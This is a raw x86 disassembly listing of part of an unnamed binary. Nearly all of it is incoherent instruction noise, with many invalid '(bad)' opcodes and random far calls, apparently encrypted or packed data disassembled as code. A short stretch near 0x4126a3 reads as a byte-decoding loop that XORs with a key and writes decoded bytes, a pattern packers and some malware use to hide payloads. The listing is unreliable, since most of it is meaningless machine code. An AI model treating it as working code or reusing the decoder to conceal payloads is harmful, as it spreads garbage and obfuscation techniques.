  412356:	outs   dx,DWORD PTR ds:[esi]
  412357:	mov    edi,0xff600aef
  41235c:	jb     0x41230b
  41235e:	outs   dx,DWORD PTR ds:[esi]
  41235f:	mov    dl,0xe4
  412361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412362:	inc    ecx
  412363:	das    
  412364:	xchg   edi,eax
  412365:	sub    eax,0x5a14d9c3
  41236a:	test   ch,dl
  41236c:	into   
  41236d:	mov    ds:0x540bd0b6,al
  412372:	test   al,0xcd
  412374:	(bad)  
  412375:	call   0x2f3c:0xd1aa1866
  41237c:	(bad)  
  41237d:	fbld   TBYTE PTR [ebp-0x15]
  412380:	out    dx,al
  412381:	test   eax,0xffaf6556
  412386:	xchg   esp,eax
  412387:	cld    
  412388:	leave  
  412389:	leave  
  41238a:	std    
  41238b:	push   0xdd4dc5b2
  412390:	xor    cl,BYTE PTR [edi-0x4d]
  412393:	pop    ebp
  412394:	push   edx
  412395:	(bad)  
  412397:	mov    al,0x35
  412399:	aad    0x12
  41239b:	sbb    edx,edx
  41239d:	push   edi
  41239e:	sbb    al,0xc6
  4123a0:	(bad)  gs:[esi+eiz*1+0x27]
  4123a5:	cmp    ebx,DWORD PTR [edi]
  4123a7:	ins    DWORD PTR es:[edi],dx
  4123a8:	ror    BYTE PTR [edi],cl
  4123aa:	dec    ecx
  4123ab:	push   ebx
  4123ac:	cwde   
  4123ad:	cli    
  4123ae:	inc    ebp
  4123af:	jo     0x41242b
  4123b1:	call   0xf7cf:0x8613f7e6
  4123b8:	rcl    DWORD PTR [esi-0x7b],0x6a
  4123bc:	iret   
  4123bd:	cwde   
  4123be:	mov    ebx,ebp
  4123c0:	and    BYTE PTR [edi-0x74],0x5b
  4123c4:	mov    ebx,0x4c53832c
  4123c9:	lahf   
  4123ca:	das    
  4123cb:	and    al,0xc5
  4123cd:	bound  eax,QWORD PTR [eax+0x6881d36d]
  4123d3:	mov    bl,0x6
  4123d5:	in     eax,dx
  4123d6:	or     ebp,DWORD PTR [eax-0x5968d50b]
  4123dc:	ret    
  4123dd:	call   FWORD PTR [ebx]
  4123df:	adc    al,0x25
  4123e1:	and    eax,esp
  4123e3:	push   ss
  4123e4:	mov    edi,DWORD PTR [esi+0x58]
  4123e7:	pop    esi
  4123e8:	ja     0x412452
  4123ea:	xor    BYTE PTR [edi],ah
  4123ec:	xor    ah,cl
  4123ee:	jo     0x4123ca
  4123f0:	dec    eax
  4123f1:	add    al,0xba
  4123f3:	xor    DWORD PTR [esi-0x6d],ebp
  4123f6:	div    DWORD PTR [ecx+0xd]
  4123f9:	fstp   QWORD PTR [esi+0x41]
  4123fc:	call   FWORD PTR [eax-0x7]
  4123ff:	outs   dx,DWORD PTR ds:[esi]
  412400:	std    
  412401:	push   cs
  412402:	cli    
  412403:	jmp    ecx
  412405:	or     edi,DWORD PTR [ecx]
  412407:	pop    es
  412408:	dec    BYTE PTR [ebp-0x5c]
  41240b:	out    0x5c,al
  41240d:	addr16 into 
  41240f:	dec    eax
  412410:	or     dh,BYTE PTR es:[esi-0x1f]
  412414:	mov    dh,0xae
  412416:	out    0x9b,al
  412418:	inc    ebx
  412419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41241a:	pop    esi
  41241b:	xchg   esi,eax
  41241c:	push   ebx
  41241d:	leave  
  41241e:	outs   dx,BYTE PTR ds:[esi]
  41241f:	cmp    DWORD PTR [ebp+0x39],ebx
  412422:	stos   BYTE PTR es:[edi],al
  412423:	jmp    0x4124a2
  412425:	retf   0xd116
  412428:	lods   eax,DWORD PTR ds:[esi]
  412429:	in     al,dx
  41242a:	or     ecx,DWORD PTR [esi]
  41242c:	xor    BYTE PTR [eax],bh
  41242e:	mov    esi,0xa13d3523
  412433:	dec    ebx
  412434:	icebp  
  412435:	jo     0x41246c
  412437:	mov    al,ds:0x19d4933b
  41243c:	and    DWORD PTR [edi+0x66],esp
  41243f:	out    dx,eax
  412440:	jb     0x4124ab
  412442:	and    eax,DWORD PTR [esi+edi*4]
  412445:	sbb    eax,0xa39b9b02
  41244a:	add    cl,BYTE PTR [ebp-0x2e89b065]
  412450:	cmp    DWORD PTR [edi+0x4ff5ec66],ecx
  412456:	sub    eax,0x38f9c731
  41245b:	(bad)  
  41245c:	sbb    eax,0xcd83be9f
  412461:	jl     0x4124b1
  412463:	push   esi
  412464:	adc    dh,cl
  412466:	mov    bl,0x6f
  412468:	arpl   si,bp
  41246a:	jno    0x41243a
  41246c:	test   al,0x93
  41246e:	mov    ebp,DWORD PTR [edi+ecx*1]
  412471:	xor    dl,BYTE PTR [ebx-0x33d4a298]
  412477:	push   edx
  412478:	int3   
  412479:	ror    DWORD PTR [ebp+eiz*1-0x72ebd020],cl
  412480:	es inc ebx
  412482:	push   ebx
  412483:	push   edi
  412484:	int3   
  412485:	xor    eax,0x249e6009
  41248a:	xor    ah,BYTE PTR [edx]
  41248c:	and    esp,DWORD PTR [ebx+0x7b]
  41248f:	sub    al,0x35
  412491:	sub    DWORD PTR [ebx],0x4aeb12ee
  412497:	push   esi
  412498:	fnstcw WORD PTR [esi]
  41249a:	dec    eax
  41249b:	or     ebx,DWORD PTR [ebp+0x2a1a1872]
  4124a1:	aaa    
  4124a2:	push   ecx
  4124a3:	xchg   ecx,eax
  4124a4:	ja     0x4124f5
  4124a6:	dec    esp
  4124a7:	jnp    0x41248a
  4124a9:	mov    edi,0x8cc5a8f0
  4124ae:	in     al,dx
  4124af:	mov    ah,0xeb
  4124b1:	xor    al,ah
  4124b3:	shl    DWORD PTR [esi-0x28],1
  4124b6:	popa   
  4124b7:	mov    al,0xb2
  4124b9:	cmp    eax,0x43aaf41e
  4124be:	popf   
  4124bf:	xchg   ebp,eax
  4124c0:	cmp    esi,DWORD PTR ds:0xc3366b2c
  4124c6:	iret   
  4124c7:	cmp    eax,DWORD PTR [ecx+0x70]
  4124ca:	xor    DWORD PTR [ebp-0x3e58e40b],ebx
  4124d0:	repnz aad 0xfb
  4124d3:	icebp  
  4124d4:	inc    eax
  4124d5:	mov    esp,0xdb49ad6d
  4124da:	loope  0x412525
  4124dc:	ins    DWORD PTR es:[edi],dx
  4124dd:	(bad)  
  4124df:	mov    al,ds:0x8b75559b
  4124e4:	dec    esi
  4124e5:	popa   
  4124e6:	adc    al,0x43
  4124e8:	inc    ebp
  4124e9:	dec    edi
  4124ea:	fistp  WORD PTR [ecx+0x7f017a5d]
  4124f0:	lods   al,BYTE PTR ds:[esi]
  4124f1:	inc    edi
  4124f2:	jno    0x4124e2
  4124f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124f5:	gs add al,0xa1
  4124f8:	sub    bh,dl
  4124fa:	pop    ds
  4124fb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4124fd:	adc    al,0xb
  4124ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412500:	mov    esi,DWORD PTR [edx]
  412502:	xor    eax,0xe7b7ef41
  412507:	je     0x412580
  412509:	mov    ecx,0x54faba07
  41250e:	cmp    ah,BYTE PTR [esi+0x65]
  412511:	jbe    0x4124b4
  412513:	loopne 0x4124b4
  412515:	repz dec edi
  412517:	dec    ebp
  412518:	idiv   DWORD PTR [ecx-0x621855a4]
  41251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41251f:	or     DWORD PTR [ebx],edi
  412521:	inc    ecx
  412522:	hlt    
  412523:	in     al,dx
  412524:	push   es
  412525:	call   0xc259:0xeca68390
  41252c:	dec    ebx
  41252d:	leave  
  41252e:	scas   eax,DWORD PTR es:[edi]
  41252f:	adc    eax,0x60afef16
  412534:	adc    eax,0x762f035
  412539:	lods   al,BYTE PTR ds:[esi]
  41253a:	pop    es
  41253b:	sbb    edi,ebp
  41253d:	add    DWORD PTR [edi-0x5295de23],0xc4363812
  412547:	aas    
  412548:	fisttp WORD PTR [edi]
  41254a:	xor    al,0xac
  41254c:	stos   BYTE PTR es:[edi],al
  41254d:	mov    esp,0xe9931410
  412552:	(bad)  
  412553:	pop    ecx
  412554:	fsubp  st(7),st
  412556:	fs adc al,0x5c
  412559:	cmp    BYTE PTR [edx],dl
  41255b:	ret    0xb88d
  41255e:	pushf  
  41255f:	nop
  412560:	fucomi st,st(7)
  412562:	into   
  412563:	inc    eax
  412564:	pushf  
  412565:	jno    0x4124fd
  412567:	test   al,0xaf
  412569:	pop    ss
  41256a:	push   ss
  41256b:	mov    ds,WORD PTR [edx]
  41256d:	sbb    DWORD PTR [ecx-0x52],edx
  412570:	dec    eax
  412571:	ins    BYTE PTR es:[edi],dx
  412572:	mov    ebp,0x28c935bf
  412577:	jge    0x41259a
  412579:	je     0x412525
  41257b:	repz adc al,0x45
  41257e:	sbb    DWORD PTR [eax+0x3c],ebx
  412581:	push   0x5c
  412583:	inc    esi
  412584:	mov    edx,0x34d2191a
  412589:	ficom  WORD PTR [edx]
  41258b:	ret    
  41258c:	jo     0x412538
  41258e:	mov    ebp,0xd039c29d
  412593:	jp     0x412607
  412595:	mov    dl,0x8c
  412597:	fsubr  DWORD PTR [ebp-0x3e]
  41259a:	out    0x27,eax
  41259c:	cmp    edx,0x541b7fbb
  4125a2:	cmc    
  4125a3:	ds jmp 0x40f:0x1a7c16f3
  4125ab:	call   0x5cabbf27
  4125b0:	test   eax,0x3ca7b265
  4125b5:	sti    
  4125b6:	xor    eax,0xcac2cafb
  4125bb:	aam    0xce
  4125bd:	add    edi,DWORD PTR [edi+0x6ccf93b2]
  4125c3:	jb     0x412553
  4125c5:	cmp    esp,eax
  4125c7:	push   ds
  4125c8:	psubb  mm0,mm0
  4125cb:	jge    0x4125c4
  4125cd:	sahf   
  4125ce:	push   cs
  4125cf:	mov    bh,0xa9
  4125d1:	aaa    
  4125d2:	mov    WORD PTR [eax-0xf],cs
  4125d5:	and    DWORD PTR [edx+0x27086db8],0x54
  4125dc:	and    DWORD PTR ds:0x1a581b9b,esi
  4125e2:	(bad)  
  4125e3:	test   al,0x64
  4125e5:	fwait
  4125e6:	jno    0x4125c7
  4125e8:	icebp  
  4125e9:	push   edi
  4125ea:	aad    0xba
  4125ec:	les    edx,FWORD PTR [ebp+0x518c1d94]
  4125f2:	(bad)  
  4125f3:	mov    DWORD PTR [ebx+0x4c75eadf],edi
  4125f9:	adc    al,0x9f
  4125fb:	dec    edx
  4125fc:	xchg   ecx,eax
  4125fd:	pop    esi
  4125fe:	add    dl,bh
  412600:	(bad)  
  412601:	mov    ebx,0x39086fe4
  412606:	out    dx,eax
  412607:	mov    ebp,0x47d4856a
  41260c:	add    eax,0x6ee3ba57
  412611:	lods   al,BYTE PTR ds:[esi]
  412612:	sub    DWORD PTR [edx-0x137c6947],edx
  412618:	inc    edx
  412619:	rcl    BYTE PTR [esp+edx*1-0x19],cl
  41261d:	dec    esp
  41261e:	dec    ebp
  41261f:	pop    ecx
  412620:	aam    0xf3
  412622:	sahf   
  412623:	jno    0x4125bf
  412625:	stos   DWORD PTR es:[edi],eax
  412626:	mov    eax,ds:0x50363bda
  41262b:	sbb    al,BYTE PTR [esi]
  41262d:	int    0x4d
  41262f:	fdiv   QWORD PTR [eax-0x37]
  412632:	cmp    BYTE PTR [eax],al
  412634:	leave  
  412635:	xchg   ebx,eax
  412636:	out    0x26,al
  412638:	cmc    
  412639:	or     dh,BYTE PTR [edx+0x5]
  41263c:	jge    0x412631
  41263e:	pop    edi
  41263f:	loopne 0x4125e7
  412641:	xchg   edx,eax
  412642:	mov    esp,0x2e85c344
  412647:	xchg   edi,eax
  412648:	dec    esi
  412649:	sbb    BYTE PTR [edi+0x11],bl
  41264c:	add    BYTE PTR [eax],0xe3
  41264f:	hlt    
  412650:	les    edi,FWORD PTR [ebp+0x2d]
  412653:	inc    esp
  412654:	out    dx,eax
  412655:	sbb    al,0xf3
  412657:	imul   edx,DWORD PTR [edi+0x7e66e70e],0x8
  41265e:	pop    es
  41265f:	rcl    DWORD PTR [bx+di],0x2f
  412663:	sbb    esi,ecx
  412665:	rcr    ebx,0x56
  412668:	pop    es
  412669:	inc    eax
  41266a:	xchg   ebx,eax
  41266b:	aas    
  41266c:	push   esp
  41266d:	loopne 0x41261e
  41266f:	inc    edi
  412670:	lods   al,BYTE PTR ds:[esi]
  412671:	mov    ah,BYTE PTR [edx]
  412673:	sub    esi,DWORD PTR [ebx]
  412675:	std    
  412676:	ja     0x412641
  412678:	shr    DWORD PTR [eax],1
  41267a:	cmc    
  41267b:	cmp    eax,0x6b466577
  412680:	jle    0x412626
  412682:	test   BYTE PTR [edx+0x54],cl
  412685:	jecxz  0x412705
  412687:	jne    0x41267b
  412689:	xchg   DWORD PTR [esi+0x282cab82],ecx
  41268f:	loop   0x4126b7
  412691:	iret   
  412692:	clc    
  412693:	mov    al,ds:0xcadd2b37
  412698:	call   0xf74d809
  41269d:	test   DWORD PTR [esi],edx
  41269f:	add    BYTE PTR [eax],al
  4126a1:	add    BYTE PTR [ebx],dh
  4126a3:	mov    BYTE PTR [ebx],0xc7
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0x97
  412711:	jnp    0x412726
  412713:	ds inc edi
  412715:	push   0x62
  412717:	bound  ecx,QWORD PTR [edx]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx-0x36]
  41271d:	aam    0x5f
  41271f:	bound  eax,QWORD PTR ds:0x8a5865b9
  412725:	mov    ebp,esp
  412727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412728:	xchg   edx,eax
  412729:	xchg   esp,eax
  41272a:	jle    0x4126fe
  41272c:	push   cs
  41272d:	fpatan 
  41272f:	sub    bl,BYTE PTR [eax-0x25441956]
  412735:	out    0x3b,al
  412737:	jge    0x4126c9
  412739:	or     esp,ecx
  41273b:	in     al,dx
  41273c:	in     eax,0xa4
  41273e:	dec    ecx
  41273f:	pop    edx
  412740:	scas   al,BYTE PTR es:[edi]
  412741:	and    ebx,ecx
  412743:	push   0xffffffbe
  412745:	mov    ebx,0x3c8c4b56
  41274a:	mul    BYTE PTR [ebp-0x66fe6831]
  412750:	clc    
  412751:	cmp    eax,DWORD PTR [ebp-0x76a771f3]
  412757:	icebp  
  412758:	popf   
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	push   esi
  41275b:	lods   eax,DWORD PTR ds:[esi]
  41275c:	jb     0x4127a1
  41275e:	mov    ebx,0xa118ffbd
  412763:	gs inc edx
  412765:	daa    
  412766:	adc    eax,0x7c30f23f
  41276b:	sub    ch,dh
  41276d:	mov    ecx,0x1d5d0a18
  412772:	lock mov esi,DWORD PTR [ecx-0x6b]
  412776:	out    0x19,eax
  412778:	(bad)  
  412779:	xlat   BYTE PTR ds:[ebx]
  41277a:	lahf   
  41277b:	pushf  
  41277c:	out    dx,al
  41277d:	mov    edx,0x207760a5
  412782:	and    bl,0x9c
  412785:	les    esi,FWORD PTR [eax-0x78006c35]
  41278b:	mov    ds:0xe34386c3,al
  412790:	es cmp eax,0xf6a8be1f
  412796:	bnd js 0x412793
  412799:	lods   al,BYTE PTR ds:[esi]
  41279a:	jge    0x4127c4
  41279c:	xor    ch,al
  41279e:	fisttp DWORD PTR [ecx+0x9bf1e3e]
  4127a4:	pop    ebp
  4127a5:	jno    0x412787
  4127a7:	pop    ebp
  4127a8:	ds das 
  4127aa:	or     eax,0xfe1466e
  4127af:	dec    esp
  4127b0:	mov    cl,0xf0
  4127b2:	retf   0x49e2
  4127b5:	sti    
  4127b6:	js     0x4127b1
  4127b8:	sub    eax,0xf4299f16
  4127bd:	adc    DWORD PTR [edx],ebx
  4127bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c0:	arpl   WORD PTR [edi-0x55],di
  4127c3:	and    eax,0x44f7a1b9
  4127c8:	ins    BYTE PTR es:[edi],dx
  4127c9:	jge    0x412766
  4127cb:	mov    bh,0x54
  4127cd:	xor    edx,0x47940bd7
  4127d3:	daa    
  4127d4:	xchg   ecx,eax
  4127d5:	lods   eax,DWORD PTR ss:[esi]
  4127d7:	enter  0x8ba7,0x6e
  4127db:	dec    eax
  4127dc:	cmp    cl,BYTE PTR [edi+0x6a9debea]
  4127e2:	sbb    al,ch
  4127e4:	fwait
  4127e5:	enter  0xc463,0x5
  4127e9:	rol    BYTE PTR [esi+0x75fa6bfb],cl
  4127ef:	sub    al,0x6e
  4127f1:	xor    ebx,DWORD PTR [ebx-0x42e4471]
  4127f7:	push   es
  4127f8:	jnp    0x41280a
  4127fa:	jno    0x41287b
  4127fc:	add    bh,BYTE PTR [esi+0x32]
  4127ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412800:	fnstenv [ecx+edi*2+0x4b8e0661]
  412807:	pushf  
  412808:	jge    0x4127e2
  41280a:	adc    ah,BYTE PTR [edx]
  41280c:	fcmovnbe st,st(3)
  41280e:	or     eax,0xc5d7cbe8
  412813:	ficomp DWORD PTR [esi-0x151e9e14]
  412819:	fiadd  DWORD PTR [esi]
  41281b:	mul    BYTE PTR [ebx-0x58]
  41281e:	div    BYTE PTR [edi+ebx*8-0x29]
  412822:	mov    DWORD PTR [edi],eax
  412824:	addr16 stc 
  412826:	std    
  412827:	retf   
  412828:	repnz mov ebx,0xfcb3cb42
  41282e:	inc    eax
  41282f:	test   al,0x84
  412831:	nop
  412832:	push   esp
  412833:	test   eax,0x572e8443
  412838:	out    dx,eax
  412839:	out    dx,al
  41283a:	rcr    ecx,0xa2
  41283d:	dec    esi
  41283e:	mov    bl,0x9c
  412840:	das    
  412841:	mov    eax,0x177339d8
  412846:	gs mov edx,0x59216da3
  41284c:	fist   WORD PTR [ebp+edx*2+0x6deff6eb]
  412853:	sub    al,0x78
  412855:	and    eax,0x6ee34f66
  41285a:	mov    esp,0x86fff091
  41285f:	xchg   BYTE PTR [eax-0x501bd273],ah
  412865:	inc    ebx
  412866:	outs   dx,BYTE PTR ds:[esi]
  412867:	shl    DWORD PTR [eax+0x43],1
  41286a:	dec    ebp
  41286b:	add    eax,0x9d0ba864
  412870:	add    BYTE PTR [edi-0x7dfc424d],al
  412876:	cs pushf 
  412878:	pop    ds
  412879:	cmp    BYTE PTR [ebp+0x39],cl
  41287c:	sub    eax,0xd39cde7f
  412881:	mov    eax,DWORD PTR ds:0x8aed40fc
  412887:	dec    esi
  412888:	ja     0x4128b9
  41288a:	aas    
  41288b:	push   eax
  41288c:	stos   BYTE PTR es:[edi],al
  41288d:	inc    ebx
  41288e:	inc    eax
  41288f:	(bad)  
  412890:	sbb    BYTE PTR [edi+0x2a],al
  412893:	(bad)  
  412894:	adc    ecx,DWORD PTR [ebx-0x8]
  412897:	sbb    al,0xc6
  412899:	in     eax,0x74
  41289b:	mov    esi,0x25a7fc0b
  4128a0:	daa    
  4128a1:	pop    ecx
  4128a2:	xor    bl,BYTE PTR [ecx+0x7b]
  4128a5:	or     DWORD PTR [edi],ecx
  4128a7:	in     al,0xba
  4128a9:	imul   eax,ecx,0xd0317aa5
  4128af:	out    0x2f,al
  4128b1:	mov    ah,0x6c
  4128b3:	(bad)  
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	ins    DWORD PTR es:[edi],dx
  4128b6:	sti    
  4128b7:	lea    ecx,[edi+0x7e9de2e1]
  4128bd:	xor    esi,DWORD PTR [edi-0x3c]
  4128c0:	mov    eax,ds:0xc8fedb6f
  4128c5:	imul   eax,DWORD PTR [esi+0x18],0x50693608
  4128cc:	mov    eax,ebx
  4128ce:	xchg   bl,bh
  4128d0:	iret   
  4128d1:	popa   
  4128d2:	fldcw  WORD PTR [ecx-0x2e7eb684]
  4128d8:	gs inc ecx
  4128da:	jl     0x412901
  4128dc:	popf   
  4128dd:	xchg   DWORD PTR [esi],edx
  4128df:	inc    esp
  4128e0:	xchg   ebp,eax
  4128e1:	push   0xffffffba
  4128e3:	(bad)  ds:0x330ad899
  4128e9:	lods   al,BYTE PTR ds:[esi]
  4128ea:	push   es
  4128eb:	xchg   ebp,eax
  4128ec:	sub    dh,ah
  4128ee:	jo     0x412946
  4128f0:	or     ebp,DWORD PTR [edx+0x49b7bbbd]
  4128f6:	jg     0x4128cc
  4128f8:	retf   0xf46e
  4128fb:	pop    ds
  4128fc:	cld    
  4128fd:	sub    BYTE PTR [edi-0x20],ah
  412900:	add    cl,BYTE PTR cs:[edi]
  412903:	pop    esp
  412904:	xchg   edi,eax
  412905:	(bad)  
  412906:	test   al,0x25
  412908:	into   
  412909:	mov    esp,0xbb01e191
  41290e:	jmp    0x1199:0x2b1bc222
  412915:	pop    eax
  412916:	jg     0x41289c
  412918:	xchg   edx,eax
  412919:	out    dx,eax
  41291a:	sar    DWORD PTR ds:0x8a29bc77,0x76
  412921:	sbb    al,0x58
  412923:	jno    0x41292c
  412925:	push   ss
  412926:	fs (bad) 
  412928:	imul   eax,DWORD PTR [ebx],0xa25593bb
  41292e:	mov    BYTE PTR [ebx+0x56],ch
  412931:	lea    edi,[esp+edi*8-0x22]
  412935:	(bad)
  412938:	ins    DWORD PTR es:[edi],dx
  412939:	add    edx,ecx
  41293b:	pop    es
  41293c:	(bad)  
  41293d:	mov    bl,0x58
  41293f:	(bad)  
  412940:	fmulp  st(0),st
  412942:	xchg   esi,eax
  412943:	or     DWORD PTR gs:[edx-0x78],esi
  412947:	and    DWORD PTR ss:[edi+0x5838d21],edx
  41294e:	inc    ebp
  41294f:	adc    edx,DWORD PTR [ebp-0x2e03999d]
  412955:	and    eax,0xfa08e078
  41295a:	(bad)  
  41295b:	pop    edi
  41295c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41295d:	mov    al,0x8c
  41295f:	fcomp  DWORD PTR [esi]
  412961:	and    DWORD PTR [ebp+0x16],edi
  412964:	fisttp DWORD PTR [edi-0x49fc0a7d]
  41296a:	pop    eax
  41296b:	out    0x7b,al
  41296d:	(bad)  
  41296e:	sbb    DWORD PTR [esi],0x61
  412971:	and    BYTE PTR [ecx-0x2c],al
  412974:	jno    0x41297c
  412976:	pop    ecx
  412977:	mov    edx,0x7227d308
  41297c:	fsubr  DWORD PTR [esi+edx*2+0x24a26051]
  412983:	xor    al,0x7b
  412985:	fcmovbe st,st(7)
  412987:	inc    ebp
  412988:	imul   ebp,DWORD PTR [ebx+0x3c],0xffffffd7
  41298c:	inc    edi
  41298d:	mov    WORD PTR [eax],?
  41298f:	aam    0xf0
  412991:	rcr    DWORD PTR [ecx+edi*4+0x29],1
  412995:	sub    cx,WORD PTR [ebx]
  412998:	fisttp QWORD PTR [ebx]
  41299a:	pop    esp
  41299b:	push   ecx
  41299c:	push   es
  41299d:	or     eax,0xb893d474
  4129a2:	retf   
  4129a3:	add    edx,eax
  4129a5:	lds    esp,FWORD PTR [ebx+0x792521d3]
  4129ab:	aam    0x7f
  4129ad:	in     al,dx
  4129ae:	outs   dx,DWORD PTR ds:[esi]
  4129af:	pop    esp
  4129b0:	cmp    bh,BYTE PTR [ebx]
  4129b2:	dec    ebp
  4129b3:	icebp  
  4129b4:	iret   
  4129b5:	xlat   BYTE PTR ds:[ebx]
  4129b6:	int    0xc5
  4129b8:	outs   dx,BYTE PTR ds:[esi]
  4129b9:	mov    ebx,0xb31f924d
  4129be:	jo     0x412984
  4129c0:	cli    
  4129c1:	sbb    al,0xcd
  4129c3:	in     eax,dx
  4129c4:	aad    0x7f
  4129c6:	mov    BYTE PTR [edi+eiz*2-0xf],dl
  4129ca:	adc    al,0x7b
  4129cc:	or     BYTE PTR [ecx+0x465ae8e5],dl
  4129d2:	pushf  
  4129d3:	test   eax,0x9feb4a7e
  4129d8:	mov    esi,DWORD PTR [esi+0x191ef94e]
  4129de:	in     eax,dx
  4129df:	inc    edi
  4129e0:	or     al,0xcd
  4129e2:	hlt    
  4129e3:	pushw  0xf
  4129e6:	pop    esp
  4129e7:	out    0x6e,al
  4129e9:	and    al,0x12
  4129eb:	mov    edx,edx
  4129ed:	adc    eax,0xa2d3b
  4129f2:	leave  
  4129f3:	mov    ebp,esp
  4129f5:	jae    0x412a01
  4129f7:	mov    esi,edx
  4129f9:	imul   edx,edi,0x6e
  4129fc:	retf   
  4129fd:	jo     0x4129eb
  4129ff:	pop    ebp
  412a00:	sar    DWORD PTR [edi+0x5e075bab],0x49
  412a07:	sbb    cl,BYTE PTR [ebx]
  412a09:	in     eax,0xb5
  412a0b:	jns    0x4129e6
  412a0d:	push   edx
  412a0e:	cmp    al,0x99
  412a10:	daa    
  412a11:	mov    ecx,0x3f485f99
  412a16:	pop    ss
  412a17:	jecxz  0x41299e
  412a19:	repnz sbb DWORD PTR [edi-0x5907058b],eax
  412a20:	jl     0x4129df
  412a22:	cmc    
  412a23:	or     al,0x7b
  412a25:	jmp    0x3dd7:0x65985a5
  412a2c:	sar    BYTE PTR [esi+0x19],0x4a
  412a30:	sub    BYTE PTR [edx],dl
  412a32:	adc    BYTE PTR ds:[ebx-0x63830316],0xcd
  412a3a:	js     0x412a5d
  412a3c:	cs aaa 
  412a3e:	ficom  WORD PTR [ecx+0x2c]
  412a41:	dec    edi
  412a42:	xor    eax,0x39015672
  412a47:	test   eax,0x8c1415b
  412a4c:	sbb    bh,BYTE PTR [ebx+0x37]
  412a4f:	xor    DWORD PTR [eax+0x504048a0],esp
  412a55:	xor    dh,BYTE PTR [esi]
  412a57:	pop    ebx
  412a58:	jl     0x412a88
  412a5a:	lods   eax,DWORD PTR ds:[esi]
  412a5b:	cmp    ebx,eax
  412a5d:	fs xor edi,0xa4804117
  412a64:	(bad)  
  412a65:	push   cs
  412a66:	or     al,0x9c
  412a68:	sbb    BYTE PTR [edx+ebx*4+0x3ec279dc],0x27
  412a70:	loope  0x412a35
  412a72:	outs   dx,BYTE PTR ds:[esi]
  412a73:	xchg   ebx,eax
  412a74:	jmp    0xf72ab89d
  412a79:	scas   al,BYTE PTR es:[edi]
  412a7a:	call   0x33db500f
  412a7f:	xor    edi,0x4b
  412a82:	out    0x9b,eax
  412a84:	mov    bh,0xc3
  412a86:	add    BYTE PTR [edx-0x779cf3b3],ah
  412a8c:	add    BYTE PTR [esi-0x4cbd35ac],dh
  412a92:	cmp    DWORD PTR [esi],ecx
  412a94:	sub    DWORD PTR [ebx+0x126ecd47],eax
  412a9a:	and    eax,0xf2600538
  412a9f:	push   ss
  412aa0:	sbb    eax,0x6e2af880
  412aa5:	cmp    al,0xe0
  412aa7:	push   esi
  412aa8:	mov    esp,0x26703b0a
  412aad:	add    cl,cl
  412aaf:	inc    edx
  412ab0:	xchg   ecx,eax
  412ab1:	push   ebx
  412ab2:	sbb    al,0x5
  412ab4:	js     0x412a40
  412ab6:	inc    ecx
  412ab7:	jo     0x412af5
  412ab9:	add    edx,0x7b642dcc
  412abf:	xor    esp,DWORD PTR [ecx]
  412ac1:	loopne 0x412a96
  412ac3:	mov    ebx,DWORD PTR [ecx-0x24]
  412ac6:	xor    bh,BYTE PTR [esp+eiz*2-0x41]
  412aca:	test   al,0xe9
  412acc:	pop    eax
  412acd:	stos   BYTE PTR es:[edi],al
  412ace:	xchg   ebx,eax
  412acf:	pop    edi
  412ad0:	cs push edi
  412ad2:	mov    eax,0x57a59a8a
  412ad7:	inc    eax
  412ad8:	mov    edi,0x21fc33e5
  412add:	lods   al,BYTE PTR ds:[esi]
  412ade:	xor    edi,DWORD PTR [esi+0x65]
  412ae1:	cwde   
  412ae2:	push   es
  412ae3:	jmp    0x412b45
  412ae5:	and    eax,0x5099ff10
  412aea:	mov    ebx,ss
  412aec:	and    eax,eax
  412aee:	rcl    DWORD PTR [edi-0x484718a4],0x42
  412af5:	cmp    ch,bh
  412af7:	jg     0x412b12
  412af9:	nop
  412afa:	shr    BYTE PTR [edx],cl
  412afc:	xor    al,0xe7
  412afe:	pushf  
  412aff:	fld    QWORD PTR [esi]
  412b01:	adc    edi,DWORD PTR [edx*2+0x48b7dd3b]
  412b08:	inc    ebx
  412b09:	(bad)  
  412b0b:	in     eax,dx
  412b0c:	or     ebp,DWORD PTR [edi+ebp*8-0x11]
  412b10:	loopne 0x412b1e
  412b12:	call   edi
  412b14:	mov    ds:0x6d726a0c,al
  412b19:	xchg   esi,eax
  412b1a:	sbb    al,0x94
  412b1c:	cmp    DWORD PTR [edi+ecx*4-0xa],eax
  412b20:	dec    eax
